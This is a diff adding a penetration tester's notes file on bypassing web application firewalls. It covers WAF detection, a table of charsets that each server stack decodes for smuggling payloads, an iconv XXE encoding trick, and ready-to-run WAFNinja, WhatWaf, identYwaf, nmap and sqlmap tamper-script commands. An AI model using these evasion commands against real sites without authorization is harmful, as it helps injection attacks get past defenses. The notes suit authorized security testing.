@@ -1,0 +1,122 @@
+WAF BYPASS TECHNIQUES
+
+
+
+
+DETECTION
+Check for WAF-set cookies
+Check for identifying headers
+	-check for altered headers or irregular charcters in headers
+	--check Server: header
+Check for unusual response codes with tampered requests
+Make GET requests to irregular open ports 
+
+
+
+
+Content-Type Tampering
+
+http://www.iana.org/assignments/media-types/media-types.xhtml
+	-IANA list for registered media types
+	
+
+
+Charset Encoding Payload Smuggling
+
+iconv -f ascii -t utf-16BE
+
+Target					Post(application/x-www-form-urlencoded)			Note(s)
+Nginx,					IBM037, IBM500, cp875, IBM1026, IBM273			query string and body were encoded
+uWSGI-Django-Python3													url-decoded parameters in query string and body afterwards
+																		equal sign and ampersand needed to be encoded as well (no url-encoding)
+
+Nginx,					IBM037, IBM500, cp875, IBM1026, utf-16, utf-32,	query string and body were encoded
+uWSGI-Django-Python2	utf-32BE, IBM424								url-encoded parameters in query string and body
+																		equal sign and ampersand should not be encoded in any way
+
+Apache-TOMCAT8-			IBM037, IBM500, IBM870, cp875, IBM1026,			query string in its original format (not encoded – could be url- encoded as usual)
+JVM1.8-JSP	 			IBM01140, IBM01141, IBM01142, IBM01143,			equal sign and ampersand should not be encoded in any way
+						IBM01144, IBM01145, IBM01146, IBM01147,			body could be sent with/without url-encoding
+						IBM01148, IBM01149, utf-16, utf-32, utf-32BE,
+						IBM273, IBM277, IBM278, IBM280, IBM284, IBM285,
+						IBM290, IBM297, IBM420, IBM424, IBM-Thai,
+						IBM871, cp1025
+
+Apache-TOMCAT7-			IBM037, IBM500, IBM870, cp875, IBM1026,			query string in its original format (not encoded)
+JVM1.6-JSP				IBM01140, IBM01141, IBM01142, IBM01143,			equal sign and ampersand should not be encoded
+						IBM01144, IBM01145, IBM01146, IBM01147,			body could be sent with/without url-encoding
+						IBM01148, IBM01149, utf-16, utf-32, utf-32BE,
+						IBM273, IBM277, IBM278, IBM280, IBM284, IBM285,
+						IBM297, IBM420, IBM424, IBM-Thai, IBM871,
+						cp1025	
+
+Apache-PHP5				None
+(mod_php & FastCGI)
+
+IIS8-PHP7.1-FastCGI		None
+
+IIS6,7.5,8,10-			None
+ASP Classic
+
+IIS6,7.5,8,10-			IBM037, IBM500, IBM870, cp875, IBM1026, IBM01047,	query string and body were encoded
+ASPX(v4.x)				IBM01140, IBM01141, IBM01142, IBM01143, IBM01144,	equal sign and ampersand should not be encoded
+						IBM01145, IBM01146, IBM01147, IBM01148, IBM01149,	body could be sent with/without url-encoding
+						utf-16, unicodeFFFE, utf-32, utf-32BE, IBM273,
+						IBM277, IBM278, IBM280, IBM284, IBM285, IBM290,
+						IBM297, IBM420,IBM423, IBM424,
+						x-EBCDIC-KoreanExtended,IBM-Thai, IBM871, IBM880,
+						IBM905, IBM00924, cp1025	
+
+Double-encoded charset payload smuggling with XML payloads
+echo -n '<?xml version="1.0" encoding="UTF-8"?>' >dtd.xml && echo '?><a>31337</a>' | iconv -f UTF-8 -t UTF-16BE >>dtd.xml
+	--for a more thorough explanation see note xxe.txt
+	
+
+Accepted Content Type Dispositions:
+text/html
+text/xml
+application/xml
+application/xhtml+xml
+application/xml-dtd
+application/rss+xml
+image/svg+xml
+text/xml-external-parsed-entity
+application/xml-patch+xml
+application/xenc+xml
+application/wsdl+xml
+application/soap+xml
+application/rfc+xml
+
+
+
+Tools:
+WAFNinja
+		Fuzzing
+	python wafninja.py fuzz -u <target> -t xss
+		Bypassing
+	python wafninja.py bypass -u <target> -p "name=<payload>&Submit=Submit" -t xss
+		Insert Fuzzing
+	python wafninja.py insert-fuzz -i select -e select -t sql
+https://github.com/khalilbijjou/wafninja
+
+WhatWaf
+	whatwaf -u <target> --ra --throttle 2
+		--WAF evasion
+https://github.com/ekultek/whatwaf
+
+SQLMap Tamper Scripts
+		General
+	sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,base64encode,between,chardoubleencode,charencode,charunicodeencode,equaltolike,greatest,ifnull2ifisnull,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2plus,space2randomblank,unionalltounion,unmagicquotes
+		MSSQL Tamper Testing
+	sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,charencode,charunicodeencode,equaltolike,greatest,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,sp_password,space2comment,space2dash,space2mssqlblank,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes
+		MySQL Tamper Testing
+	sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=between,bluecoat,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,securesphere,space2comment,space2hash,space2morehash,space2mysqldash,space2plus,space2randomblank,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords,xforwardedfor
+		Generic Tamper Testing
+	sqlmap -u <target> --level=5 --risk=3 -p 'item1' --tamper=apostrophemask,apostrophenullencode,appendnullbyte,base64encode,between,bluecoat,chardoubleencode,charencode,charunicodeencode,concat2concatws,equaltolike,greatest,halfversionedmorekeywords,ifnull2ifisnull,modsecurityversioned,modsecurityzeroversioned,multiplespaces,nonrecursivereplacement,percentage,randomcase,randomcomments,securesphere,space2comment,space2dash,space2hash,space2morehash,space2mssqlblank,space2mssqlhash,space2mysqlblank,space2mysqldash,space2plus,space2randomblank,sp_password,unionalltounion,unmagicquotes,versionedkeywords,versionedmorekeywords
+
+NMap
+	nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 <target>
+
+IdentYwaf
+	python identYwaf.py --delay=2 --proxy=<proxy> <target>
+https://github.com/stamparm/identywaf
